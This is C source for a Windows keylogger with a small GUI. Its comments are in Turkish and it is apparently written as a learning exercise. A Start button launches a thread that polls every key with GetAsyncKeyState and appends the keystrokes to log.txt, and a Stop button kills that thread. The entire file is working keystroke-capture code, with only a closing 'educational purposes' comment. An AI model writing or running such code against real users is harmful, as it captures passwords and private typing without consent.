#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <synchapi.h>

const char CLASS_NAME[] = "keyloggerWindowdClass";
HANDLE hThread = NULL; //Keylogger thread'ini takip etmek için global degişken

// Keylogger Fonksiyon (thread)
DWORD WINAPI keyloggerThread(LPVOID lpParam) {
	FILE* file;
	fopen_s(&file, "log.txt", "a+"); //log.txt dosyasına ekle

	if (file == NULL) {
		MessageBox(NULL, L"Log dosyası acılmadı", L"Hata ", MB_OK);
		return 1;
	}
	// sonsuz dongu :Program sürekliolarak calısacak
	while (1) {
		//8'dem 25'e kadar tüm tüs kodları kontrol et (bazı ozel tuslar 0-7 arasında oldugunu gosterbilir ama genelde 8-255 arası kulanılır
		for (int key = 8; key <= 255;key++) {
			//Eger'key' kodundaki tuşa basılmışsa (0x8000: tuşun o anda basılı oldugunu gosterir 
			if (GetAsyncKeyState(key) & 0x8000) {
				//Dosyaya basılan tuşun karakterin yaz 
				fprintf(file, "%c", key);
				//Yazılan verinin hemen dosyaya kaydedilmedisini saglar (buffer' temizler)
				fflush(file);
				//Her tuş basımnı arasında 100 milisaniye bekle (aynı tuşun tekrar  yazılaması engeller )
				Sleep(100);

			}
		}
		//Her dongü sonunda 10 milisaniye bekle (sistemin için)
		Sleep(10);
	}
	// Not:Buraya  su an ulasılamaz, aşagıda çozüm ekleyecewgiz
	return 0;
}

//Pencereye gelen mesajları yoneten fonksiyon
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_DESTROY:
		if (hThread != NULL) {
			TerminateThread(hThread, 0);//Thread 'i zorla kapat
			CloseHandle(hThread);

		}
		PostQuitMessage(0); //Pencere kapanınca programı zrla sonlandır
		return 0;

	case WM_COMMAND:
		if (LOWORD(wParam) == 1) { //"Başalt butona tıkalndıysa 
			if (hThread == NULL) { //Thread henüz baslamdıysa
				hThread = CreateThread(NULL, 0, keyloggerThread, NULL, 0, NULL);
				if (hThread == NULL) {
					MessageBox(hwnd, L"Thread olusturulamdı!", L"Hata", MB_OK);
				}
				else {
					MessageBox(hwnd, L"Keyloger basladı!", L"Bilgi", MB_OK);
				}

			}
			return 0;
		}

		else if (LOWORD(wParam) == 2) { //Durdur Butonu tıkalandıysa 
			if (hThread != NULL) {//Thread henüz başlamdıysa
				TerminateThread(hThread, 0);
				CloseHandle(hThread);
				hThread = NULL;
				MessageBox(hwnd, L"Keyloger durduruldu", L"Bilgi", MB_OK);


			}
			else {
				MessageBox(hwnd, L"Zaten calısmıyor", L"Bilgi", MB_OK);

			}

		}
		return 0;

	}


	return DefWindowProc(hwnd, uMsg, wParam, lParam);

}


//Programın giriş noktası
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	WNDCLASS wc = {};// WNDCLASS yapısının sıfırla ve tanımla (prencere sınıufını tanımalmak için ve içine  pencerinin ozewlikleri tanımalama)
	wc.lpfnWndProc = WindowProc; //Pencerenin mesajlarını işleyecek fonksiyon (pencereye tıklanma ,kaptma gibi olaylarını yonetecek fonksiyon)
	wc.hInstance = hInstance;  //Pencerenin hangi program ornegini ait oldugunu belirtir(Programın kendisini temsil eder 
	wc.lpszClassName = CLASS_NAME;//Pencere sınıfını oxel bir isim verilir(Or L"MyWindowClass" gibi ğpencereyi olustuıruken bu sınıfa basvuracagız

	RegisterClassW(&wc); //Yukarı tanımlanan perncere sınıfını sisteme kaydet

	HWND hwnd = CreateWindowExW(
		0,
		CLASS_NAME,
		L"Keylogger-GUI",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 600, 300,
		NULL, NULL, hInstance, NULL

	);

	if (hwnd == NULL) {
		MessageBox(NULL, L"Pencere oluşturulmadı", L"Hata", MB_OK);
		return 0;
	}

	//baslat butonu
	HWND hButton = CreateWindowExW(
		0,
		L"Button",
		L"Başlat",
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
		50, 50, 200, 40,    // Stil özellikleri:
		hwnd,              // WS_TABSTOP       : Tab tuşuyla odaklanılabilir
		(HMENU)1,         // WS_VISIBLE       : Buton görünür olacak
		hInstance,       // WS_CHILD         : Ana pencerenin çocuğu olacak (içinde yer alacak)
		NULL            // BS_DEFPUSHBUTTON : Varsayılan buton stili (Enter tuşuna basıldığında çalışır    
					   // (hwnd) Bu butonun baglı olacagı pencere(ana pencere)
					  //  (HMENU) bUTONU ıd'si=1(WM_COMMAND icindeki ait pencere)
					 // (NULL) ek veri yok
	);

	//Durdur butonu tıkalndıysa
	HWND hStopButton = CreateWindowExW(
		0,
		L"Button",
		L"Durdur",
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
		50, 100, 200, 40,
		hwnd,
		(HMENU)2,
		hInstance,
		NULL
	);


	if (hButton == NULL || hStopButton == NULL) {
		MessageBox(NULL, L"Button olustırlamdı", L"Hata", MB_OK);
		return 0;
	}

	ShowWindow(hwnd, nCmdShow);
	UpdateWindow(hwnd);

	MSG msg = {};   //  MSG, Windows'un pencerelere gönderdiği mesajları (tıklama, tuş basımı, pencereyi kapatma vb.) tutmak için kullanılan bir yapıdır.
	// Burada msg adında bir mesaj yapısı tanımlanıyor ve başlatılıyor({} ile sıfırlanıyor).
	while (GetMessage(&msg, NULL, 0, 0)) { //Bu döngü, pencereye gelen mesajları sürekli dinler ve alır.
		TranslateMessage(&msg);//Bu fonksiyon, mesajı daha okunabilir hale getirir.
		DispatchMessage(&msg); //msg içindeki mesajı alır ve ilgili pencereye iletir.
	}


	return 0;
}


//For educational purposes only
